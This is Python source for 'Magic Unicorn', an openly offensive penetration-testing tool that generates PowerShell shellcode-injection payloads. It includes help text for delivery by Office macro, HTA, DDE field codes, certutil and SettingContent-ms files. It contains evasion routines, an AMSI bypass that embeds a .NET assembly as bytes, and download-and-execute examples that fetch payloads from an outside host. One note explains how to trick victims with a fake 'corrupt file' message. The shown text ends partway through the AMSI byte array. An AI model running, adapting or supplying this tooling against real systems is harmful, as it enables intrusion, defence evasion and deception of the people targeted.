#!/usr/bin/python
#
# Magic Unicorn - PowerShell downgrade attack and exploitation tool
#
# Written by: Dave Kennedy (@HackingDave)
# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
#
# Real quick down and dirty for native x86 powershell on any platform
#
# Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro>
# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
# Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro
# HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta
#
# Requirements: Need to have Metasploit installed if using Metasploit methods.
# Also supports Cobalt Strike and custom shellcode delivery methods.
#
#
# IMPORTANT: The way this works is by using 32-bit shellcode and a 32-bit downgrade attack.
# That means your payloads should be a 32-bit payload, not a 64-bit. It will not work if you
# generate a 64-bit platform. Don't fret - the 32-bit payload works on the 64-bit platform.
#
# Special thanks to Matthew Graeber and Josh Kelley
#
import base64
import re
import subprocess
import sys
import os
import shutil
import random
import string
import binascii
from functools import reduce

#######################################################################################################
# Keep Matt Happy #####################################################################################
#######################################################################################################
# ____  __.                        _____          __    __      ___ _                                ##
#|    |/ _|____   ____ ______     /     \ _____ _/  |__/  |_   /   |   \_____  ______ ______ ___.__. ##
#|      <_/ __ \_/ __ \\____ \   /  \ /  \\__  \\   __\   __\ /    ~    \__  \ \____ \\____ <   |  | ##
#|    |  \  ___/\  ___/|  |_> > /    Y    \/ __ \|  |  |  |   \    Y    // __ \|  |_> >  |_> >___  | ##
#|____|__ \___  >\___  >   __/  \____|__  (____  /__|  |__|    \___|_  /(____  /   __/|   __// ____| ##
#        \/   \/     \/|__|             \/     \/                    \/      \/|__|   |__|   \/      ##
#######################################################################################################
#######################################################################################################


##############################################################################################################
#                                                                                                            #
#                                                                                                            #
# These are configuration options for Unicorn to automatically do certain things such as ASMI Bypassing.     #
# More to come in this section soon, but you will want to configure this to turn it on/off depending         #
# on what you need.                                                                                          #
#                                                                                                            #
##############################################################################################################


# This will append the AMSI bypass code which is longer than 8191 characters. You will want to turn this off 
# if you need a payload that works with cmd.exe as it has a character length restriction size.
AMSI_BYPASS="OFF"

# This will print out the fully decoded command for you instead of running it through the powershell obfuscated
# code.
PRINT_DECODED="OFF"

#
# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters  # + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])


# generate a random number based on range
def generate_random_number(low, high):
    for x in range(1): return random.randint(low,high)

# randomize words for evasion
def mangle_word(word):
    random_length = generate_random_number(1, len(word))
    counter = 0
    assemble = ""
    for letter in word:
        if counter == random_length:
            assemble = assemble + '"+"' + letter + '"+"' 
        else:
            assemble = assemble + letter
        counter = counter + 1 
    return assemble

# needed for color in unicorn eyes
class ColorsEnum:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'


# display unicorn banner
def gen_unicorn():
    print(r"""
                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |""" + ColorsEnum.RED + r"""\)\ """ + ColorsEnum.ENDC + r""") """ + ColorsEnum.RED + r"""/(/""" + ColorsEnum.ENDC + r"""|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=

                """)


# display amsi help
def amsi_help():
    print("""
[*******************************************************************************************************]

                                  -----AMSI BYPASS INFORMATION----


For a full writeup of this technique and how it works, visit the original research from these locations:

https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html

https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/

The way this works in Unicorn is by appending the bypass technique by disabling AMSI through patching and
disabling the AMSIScanBuffer functionality. In Unicorn this is an optional flag and can be turned off by
editing the unicorn.py file and turning AMSI_BYPASS="ON" to "OFF". The main trade-off with this technique
is that although it turns off AMSI when it's going to scan, it also increases the length of the payload
substantially. If you are working with cmd.exe as a method for a one liner powershell command, this will
increase the size of the payload more than the 8191 character size restriction. This means that when you
go to run this, you will need to do it directly through powershell.exe and not cmd.exe. 

[*******************************************************************************************************]

    """)

# display macro help
def macro_help():
    print("""
[*******************************************************************************************************]

				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
victim to thinking the excel document is corrupted. You should get a shell through powershell injection
after that.

""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need 
to modify the first line of the output from: Sub Auto_Open()
 
To: Sub AutoOpen()
 
The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.""" + ColorsEnum.ENDC + """

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

[*******************************************************************************************************]

	""")


# display hta help
def hta_help():
    print("""
[*******************************************************************************************************]

				-----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener 
for Metasploit. If you didn't use Metasploit, only two files will be exported.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

[*******************************************************************************************************]

	""")

# display powershell help
def ps_help():
    print("""
[********************************************************************************************************]

				-----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]
	""")

# display cert help
def cert_help():
    print("""
[*******************************************************************************************************]

				-----CERTUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
machine through a fake certificate file. To use this attack, simply place an executable in the path of
unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
windows machine to convert it back to a binary.

[*******************************************************************************************************]
	""")

# display dde office injection help
def dde_help():
    print("""

[*******************************************************************************************************]

                -----DDE Office COM Attack Instructions----

This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
ability to gain remote code execution without the need of macros. This attack was documented and full
instructions can be found at:

https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

In order to use this attack, run the following examples:

python unicorn.py <payload> <lhost> <lport> dde
python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde

Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
in the latter section).

In order to apply the payload, as an example (from sensepost article):

1. Open Word
2. Insert tab -> Quick Parts -> Field
3. Choose = (Formula) and click ok.
4. Once the field is inserted, you should now see "!Unexpected End of Formula"
5. Right-click the Field, choose "Toggle Field Codes"
6. Paste in the code from Unicorn
7. Save the Word document.

Once the office document is opened, you should receive a shell through powershell injection. Note
that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.

The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
we are limited to size restrictions. You will need to move the download.ps1 to a location that is
accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
directory that it has access to.

You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
as it has some great methods for not calling DDE at all.

[*******************************************************************************************************]
    """)

def custom_ps1_help():
    print("""
[*******************************************************************************************************]

				-----Custom PS1 Attack Instructions----

This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.

Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.

Examples:

python unicorn.py harmless.ps1
python unicorn.py myfile.ps1 macro
python unicorn.py muahahaha.ps1 macro 500

The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.

[*******************************************************************************************************]
	""")


# cobalt strike usage banner
def cobalt_strike():
    print("""
[*******************************************************************************************************]

                -----Import Cobalt Strike Beacon----

This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.

Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
the file, cobalt_strike_file.cs. 

The export code will look something like this:

* length: 836 bytes */
byte[] buf = new byte[836] { 0xfc, etc

Next, for usage:

python unicorn.py cobalt_strike_file.cs cs

The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.

Next simply copy the powershell command to something you have the ability for remote command execution.

NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.

There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
size. That means that from a command line argument perspective if you copy and paste you will hit the
8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
this is an issue, however if you are launching directly from PowerShell or other normal applications
this is a non-problem.

A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
issues.

[*******************************************************************************************************]
    """)

# this is used for custom shellcode generation
def custom_shellcode():
    print("""
[*******************************************************************************************************]

                -----Custom Shellcode Generation Method----

This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.

Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
following format or it will not work:

0x00,0x00,0x00 and so on.

Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
the size of 8191. This is the max command line argument size limit in Windows.

Usage:

python unicorn.py shellcode_formatted_properly.txt shellcode

Next simply copy the powershell command to something you have the ability for remote command execution.

NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
YOUR SHELLCODE IN THE TXT FILE.

There are some caveats with this attack. Note that if your payload size is large in nature it will not
fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
hit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from 
cmd.exe this is an issue, however if you are launching directly from PowerShell or other normal 
applications this is a non-problem.

A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
issues.


[*******************************************************************************************************]
    """)

# this is used for custom shellcode generation
def settings_ms():
    print("""
[*******************************************************************************************************]

                -----SettingContent-ms Extension Method----

First, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):

https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39

This method uses a specific file type called ".SettingContent-ms" which allows for the ability for both
direct loads from browsers (open + command execution) as well as extension type through embedding in 
office products. This one specifically will focus on extension type settings for command execution
within Unicorn's PowerShell attack vector.

There are multiple methods supported with this attack vector. Since there is a limited character size
with this attack, the method for deployment is an HTA. 

For a detailed understanding on weaponizing this attack visit:

https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
shellcode attacks.

The four methods below on usage: 

HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
Generate .SettingContent-ms: python unicorn.py ms

The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
just a blank .SettingContent-ms file. 

When everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in
the default root Unicorn directory (if using the standalone file generation) or under the hta_attack/
folder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:

REPLACECOOLSTUFFHERE

With:

mshta http://<apache_server_ip_or_dns_name/Launcher.hta.

Then move the contents of the hta_attack to /var/www/html.

Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
then download the Unicorn HTA file which has the code execution capabilites. 

Special thanks and kudos to Matt Nelson for the awesome research

Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

Usage: 

python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
python unicorn.py <cobalt_strike_file.cs cs ms
python unicorn.py <patth_to_shellcode.txt>: shellcode ms
python unicorn.py ms

""")

# usage banner
def gen_usage():
    print("-------------------- Magic Unicorn Attack Vector v3.6.5 -----------------------------")
    print("\nNative x86 powershell injection attacks on any Windows platform.")
    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
    print("Twitter: @TrustedSec, @HackingDave")
    print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
    print("\nHappy Magic Unicorns.")
    print("")
    print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
    print("PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443")
    print("PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe")
    print("PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro")
    print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
    print("Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro")
    print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
    print("HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms")
    print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
    print("HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms")
    print("HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms")
    print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
    print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
    print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
    print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
    print("Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)")
    print("Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)")
    print("Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)")
    print("Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)")
    print("Generate .SettingContent-ms: python unicorn.py ms")
    print("Help Menu: python unicorn.py --help\n")

# technique used from https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
# originally detailed here: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
def bypass_amsi():
    func = generate_random_string(5,10)
    amsi_string=("""function %s{if(-not ([System.Management.Automation.PSTypeName]"%s").Type){[Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 162, 107, 61, 140, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 198, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 96, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 136, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 212, 43, 0, 0, 56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 212, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 136, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 165, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 16, 33, 0, 0, 196, 10, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 170, 0, 0, 0, 1, 0, 0, 17, 114, 1, 0, 0, 112, 40, 2, 0, 0, 6, 10, 6, 126, 16, 0, 0, 10, 40, 17, 0, 0, 10, 44, 12, 114, 19, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 6, 114, 107, 0, 0, 112, 40, 1, 0, 0, 6, 11, 7, 126, 16, 0, 0, 10, 40, 17, 0, 0, 10, 44, 12, 114, 137, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 27, 106, 40, 19, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 45, 12, 114, 253, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 25, 141, 22, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 20, 0, 0, 10, 25, 40, 21, 0, 0, 10, 19, 4, 22, 17, 4, 25, 40, 22, 0, 0, 10, 7, 31, 27, 40, 23, 0, 0, 10, 17, 4, 25, 40, 4, 0, 0, 6, 114, 115, 1, 0, 112, 40, 18, 0, 0, 10, 22, 42, 30, 2, 40, 24, 0, 0, 10, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 28, 3, 0, 0, 35, 126, 0, 0, 136, 3, 0, 0, 0, 4, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 136, 7, 0, 0, 196, 1, 0, 0, 35, 85, 83, 0, 76, 9, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 92, 9, 0, 0, 104, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 26, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 24, 0, 0, 0, 15, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 169, 2, 1, 0, 0, 0, 0, 0, 6, 0, 209, 1, 34, 3, 6, 0, 62, 2, 34, 3, 6, 0, 5, 1, 240, 2, 15, 0, 66, 3, 0, 0, 6, 0, 45, 1, 191, 2, 6, 0, 180, 1, 191, 2, 6, 0, 149, 1, 191, 2, 6, 0, 37, 2, 191, 2, 6, 0, 241, 1, 191, 2, 6, 0, 10, 2, 191, 2, 6, 0, 68, 1, 191, 2, 6, 0, 25, 1, 3, 3, 6, 0, 247, 0, 3, 3, 6, 0, 120, 1, 191, 2, 6, 0, 95, 1, 109, 2, 6, 0, 128, 3, 184, 2, 6, 0, 220, 0, 34, 3, 6, 0, 210, 0, 184, 2, 6, 0, 233, 2, 184, 2, 6, 0, 170, 0, 184, 2, 6, 0, 232, 2, 184, 2, 6, 0, 92, 2, 184, 2, 6, 0, 81, 3, 34, 3, 6, 0, 205, 3, 184, 2, 6, 0, 151, 0, 184, 2, 6, 0, 148, 2, 3, 3, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 125, 0, 96, 3, 65, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 65, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 73, 0, 2, 0, 7, 0, 51, 1, 78, 0, 90, 0, 0, 0, 0, 0, 128, 0, 150, 32, 103, 3, 94, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 216, 3, 100, 0, 3, 0, 0, 0, 0, 0, 128, 0, 150, 32, 150, 3, 105, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 231, 3, 114, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 143, 0, 121, 0, 11, 0, 6, 33, 0, 0, 0, 0, 134, 24, 226, 2, 6, 0, 11, 0, 0, 0, 1, 0, 178, 0, 0, 0, 2, 0, 186, 0, 0, 0, 1, 0, 195, 0, 0, 0, 1, 0, 118, 3, 0, 0, 2, 0, 97, 2, 0, 0, 3, 0, 165, 3, 2, 0, 4, 0, 135, 3, 0, 0, 1, 0, 190, 3, 0, 0, 2, 0, 139, 0, 0, 0, 3, 0, 104, 2, 9, 0, 226, 2, 1, 0, 17, 0, 226, 2, 6, 0, 25, 0, 226, 2, 10, 0, 41, 0, 226, 2, 16, 0, 49, 0, 226, 2, 16, 0, 57, 0, 226, 2, 16, 0, 65, 0, 226, 2, 16, 0, 73, 0, 226, 2, 16, 0, 81, 0, 226, 2, 16, 0, 89, 0, 226, 2, 16, 0, 97, 0, 226, 2, 21, 0, 105, 0, 226, 2, 16, 0, 113, 0, 226, 2, 16, 0, 121, 0, 226, 2, 16, 0, 137, 0, 226, 2, 6, 0, 153, 0, 221, 2, 34, 0, 153, 0, 242, 3, 37, 0, 161, 0, 200, 0, 43, 0, 169, 0, 178, 3, 48, 0, 185, 0, 195, 3, 53, 0, 209, 0, 135, 2, 61, 0, 209, 0, 211, 3, 66, 0, 153, 0, 209, 2, 75, 0, 129, 0, 226, 2, 6, 0, 46, 0, 11, 0, 125, 0, 46, 0, 19, 0, 134, 0, 46, 0, 27, 0, 165, 0, 46, 0, 35, 0, 174, 0, 46, 0, 43, 0, 190, 0, 46, 0, 51, 0, 190, 0, 46, 0, 59, 0, 190, 0, 46, 0, 67, 0, 174, 0, 46, 0, 75, 0, 196, 0, 46, 0, 83, 0, 190, 0, 46, 0, 91, 0, 190, 0, 46, 0, 99, 0, 220, 0, 46, 0, 107, 0, 6, 1, 46, 0, 115, 0, 19, 1, 99, 0, 123, 0, 97, 1, 1, 0, 3, 0, 0, 0, 4, 0, 26, 0, 1, 0, 156, 2, 0, 1, 3, 0, 103, 3, 1, 0, 0, 1, 5, 0, 216, 3, 1, 0, 0, 1, 7, 0, 150, 3, 1, 0, 0, 1, 9, 0, 228, 3, 2, 0, 204, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 119, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 81, 0, 130, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 0, 109, 115, 99, 111, 114, 108, 105, 98, 0, 115, 114, 99, 0, 68, 105, 115, 97, 98, 108, 101, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 71, 117, 105, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 86, 105, 115, 105, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 